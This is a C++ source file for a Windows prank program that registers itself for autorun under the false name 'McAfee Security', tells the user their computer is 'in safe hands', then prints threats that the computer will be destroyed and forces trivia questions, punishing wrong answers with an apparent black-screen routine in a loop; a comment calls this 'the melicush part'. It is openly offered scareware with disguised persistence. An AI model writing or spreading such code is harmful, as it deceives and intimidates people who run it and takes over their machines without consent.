#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <string>

#include "trivia.h"
#include "black_screen.h"


// Function to get the current executable's path
std::wstring GetAppPath() {
    WCHAR path[MAX_PATH];  // Use WCHAR for wide character array
    GetModuleFileNameW(NULL, path, MAX_PATH);  // Retrieves the full path of the executable in wide characters
    return std::wstring(path);  // Return as std::wstring (wide string)
}

void static AddToStartup() {
    HKEY hKey;
    const WCHAR* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const WCHAR* appName = L"McAfee Security";
    std::wstring appPath = GetAppPath();

    // Open the registry key
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Set the value in the registry
        RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        std::cout << "Great! your computer now is in safe hands." << std::endl;
    }
    else {
        std::cout << "Failed to open registry key!" << std::endl;
    }
}

int make_trivia(void)
{
    printf("\n\n");
    int ans = GenerateTriviaQuestions(3);  // Generate 3 trivia questions
   //system("pause");
    return ans;
}

void ascii_print(void)
{
    std::cout << R"(
     ---   .    ____        -----      ______   -----        .
  ___     / \             .....................      ____   / \
        .'   '.  --  ..:::::''''''''''''''''':::::..      .'   '.
  ---   | ^ ^ |    .::::''''                 ''''::::. -- | ^ ^ '
        | ^ ^ |  .::''                             ''::.  | ^ ^ | --
____     '...'  .::'              .-.                '::.  '...'
        .-.!_  .::'              /   \                '::.   ! ____
       / / `-`.:'                '-.-'                  ':..""".
 --    ' |  '.|:'                 .'.                   ':/' |  \
       | |   |'.               _/^---^\_                  |     . --
 ___    \ .  '|               \-------../                 \   '.'
        ' :   '                '.\:::/.'                  |'   || ___
        | |  .|                 | | |'|                   / ' . |
    --  | '. | \                '.\ /.'                   '.  | |--
        |'.   '|                 |[ ]|                    | .'  |____
__    .'\ |  .'\                 '.^.'                    \ |.  .
     .'-.\'. | |                  (:)                     | ||| |
   .'    \'..' .             _..--'''--.._               /'-._.-'| ---
   |       `-..'.         .-'             '-.           |      .-'.
    \            `-.    .'  ..            .. '.        .'-._.-'    `.
--   )              `-./    '::.        .::'   \   _.-'             /
     '._/-..          /       '::.    .::'      \-'              .-'
         ::.`-.      ''        '::   ::'        ''       _..-\_.'
         :::   '._   | \         '   '         / |    .-'   .:: _____
____     :::      `-.|  '  .----..___..----.  '  | .-'      :::
         :::          \ |  _..--.     .--.._  | /-'         ::: ---
         :::          | ' /     |     |     \ ' |           :::
   --    :::          )   |   _.'     '._   |   (           :::____
    ____ :::          /'. \_.'   )\ /(   '._/ .'\           :::
         :::       .-'|  `-->-@ /     \ @->--'  |-.         :::
         :::    .-'   \         | / \ |         /  `-.      :::  ---
 ----    '' _.-'       |        )/   \(        |      `-.   :::  _____
  _.-=--..-'          . \ /\               /\ /          `-. ''
 /.._    `.        .-'   .\ '-.\.\\.//./.-' /.`-.           `---.._
|    `.    \    .-'      | '.             .' |   `-.                \ 
 \    _\.   `.-'         |   '-././.\.\.-'   |      `.               |
  `.-'  |   /::::::::::: \                   /::::::::`.      ,-.    /
 - |   /   /NOM     ----  '-.             .-'     ----  `.    |  \_.'
__ \   | .'     _____        '-._._._._.-'     ____      |    |   |
    `--'                                                 `-.  '._ / --
                                                            `...-'
    )" << std::endl;
}
void viva(void)
{
    static int x;
    printf("\nviva victoria!");
    x++;
    // printf("\ntotal number: %d", x);	
    printf("\n\nYour computer is about to be destroyed.");
    printf("\nYour chances of survival are:: 1 to %d\n", x);
    //	ascii_print();
}


int main()
{
    // adding to aurorun
    AddToStartup();
    std::cout << "Running Windows Bunny program..." << std::endl;

    // here is the melicush part!
    srand((unsigned)time(NULL));
    int timer = rand();
    for (int i = 0; i < timer; i++)
    {
        viva();
    }

    int black_time = 10000;
    while (true)
    {
    int ans = make_trivia();
    if (ans == 0 || ans == -1)
    {
        ascii_print();
        printf("\n                 -------------> YOU WERE WRONG! NOW YOU WILL BE PUNISHED... <----------------\n\n");
        std::this_thread::sleep_for(std::chrono::milliseconds(10000));
        black_main(black_time);
        system("pause");
    }
    else
    {
        printf("You were right this time. antil we meet again...");
        break;
    }
    }

    return 1;
}